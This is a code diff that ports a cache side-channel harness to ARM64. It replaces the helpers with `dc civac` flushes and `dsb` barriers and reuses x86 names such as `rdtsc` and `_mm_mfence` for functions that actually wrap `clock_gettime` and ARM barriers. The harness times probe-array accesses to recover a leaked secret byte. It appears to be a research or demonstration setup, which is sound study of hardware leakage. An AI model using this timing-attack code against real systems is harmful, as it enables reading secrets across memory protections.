@@ -16,36 +16,38 @@
 // Global probe array for cache side-channel attacks
 uint8_t probe_array[PROBE_ARRAY_SIZE];
 
-// ARM64 cache flush instruction (DC CIVAC - Clean and Invalidate to Point of Coherency)
-static inline void arm64_clflush(volatile void *addr)
-{
-    __asm__ volatile("dc civac, %0" : : "r"(addr) : "memory");
-}
-
-// ARM64 memory barrier (DSB - Data Synchronization Barrier)
-static inline void arm64_mfence()
-{
-    __asm__ volatile("dsb sy" : : : "memory");
-}
-
-// ARM64 load fence (DSB - Data Synchronization Barrier)
-static inline void arm64_lfence()
-{
-    __asm__ volatile("dsb ld" : : : "memory");
-}
-
-// Function to flush the probe_array from cache
+// ARM64-compatible cache flush function
 void flush_probe_array()
 {
     for (int i = 0; i < NUM_CACHE_LINES; i++)
     {
-        arm64_clflush(&probe_array[i * CACHE_LINE_SIZE]);
+        // Use ARM64 DC CIVAC instruction to flush cache line
+        __asm__ __volatile__("dc civac, %0" : : "r"(&probe_array[i * CACHE_LINE_SIZE]) : "memory");
     }
-    arm64_mfence(); // Ensure flushes are complete and ordered
+    // Memory barrier to ensure flushes are complete
+    __asm__ __volatile__("dsb ish" : : : "memory");
 }
 
-// High-resolution timing using clock_gettime (portable alternative to rdtsc)
-static inline uint64_t get_time_ns()
+// ARM64-compatible memory fence
+void _mm_mfence()
+{
+    __asm__ __volatile__("dsb ish" : : : "memory");
+}
+
+// ARM64-compatible load fence
+void _mm_lfence()
+{
+    __asm__ __volatile__("dsb ish" : : : "memory");
+}
+
+// ARM64-compatible cache flush for a single address
+void _mm_clflush(void *addr)
+{
+    __asm__ __volatile__("dc civac, %0" : : "r"(addr) : "memory");
+}
+
+// High-resolution timing using clock_gettime
+static __inline__ uint64_t rdtsc()
 {
     struct timespec ts;
     clock_gettime(CLOCK_MONOTONIC, &ts);
@@ -57,10 +59,10 @@ static inline uint64_t get_time_ns()
 long long measure_access_time(volatile uint8_t *addr)
 {
     uint64_t start_time, end_time;
-    start_time = get_time_ns();
+    start_time = rdtsc();
     volatile uint8_t dummy = *addr; // Access the memory
-    arm64_mfence();                 // Ensure access completes before reading time
-    end_time = get_time_ns();
+    _mm_mfence();                   // Ensure access completes before reading time
+    end_time = rdtsc();
     return end_time - start_time;
 }
 
@@ -80,9 +82,9 @@ void common_init()
     {
         probe_array[i] = 1;
     }
-    arm64_mfence();
+    _mm_mfence();
     flush_probe_array(); // Clear it out for fresh start
-    arm64_mfence();
+    _mm_mfence();
 }
 
 // Common function for cache timing measurement phase
@@ -91,7 +93,7 @@ int perform_measurement(uint8_t expected_secret, const char *secret_name)
     printf("Measuring cache timings...\n");
     int leaked_byte = -1;
     long long min_time = -1;
-    int CACHE_HIT_THRESHOLD = 100; // Nanoseconds, tune based on system (often 50-200ns for L1 hit)
+    int CACHE_HIT_THRESHOLD = 100; // Nanoseconds, tune based on system
 
     for (int i = 0; i < NUM_CACHE_LINES; i++)
     {
